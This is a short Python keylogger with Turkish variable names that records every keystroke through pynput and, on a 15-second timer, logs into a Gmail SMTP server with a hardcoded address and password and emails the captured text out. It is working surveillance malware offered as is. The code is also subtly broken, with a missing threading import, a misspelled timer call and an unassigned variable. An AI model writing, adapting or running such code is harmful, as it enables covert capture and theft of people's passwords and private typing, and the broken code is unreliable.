import pynput.keyboard
import smtplib

toplama= "Key logger baslatiliyor..."
def emir(harfler):
    global toplama
    print("----------------------")
    try:
        toplama += str(harfler.char)
        print(toplama)
    except AttributeError:  
        if harfler == harfler.space:
            toplama += " "
        elif harfler == harfler.backspace:
            sayi = len(toplama)
            sayi -= 1
            deger=0
            while sayi>deger:
                sonuc += toplama[deger]
                deger += 1
            toplama = sonuc
        elif harfler==harfler.enter:
            toplama += "\n"
        else:
            toplama += str(harfler)  


def mail_gonder(mesaj):
    global toplama
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login("wpbothacker@gmail.com","keylogger06")
    server.sendmail("wpbothacker@gmail.com","wpbothacker@gmail.com",mesaj)
    server.quit()

def dallanma():
    global toplama
    if toplama:
        mail_gonder(toplama)
        toplama=""
    timer = threading.Timer(15,dallanma)
    timer.star()

dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
    dallanma()
    dinleme.join()


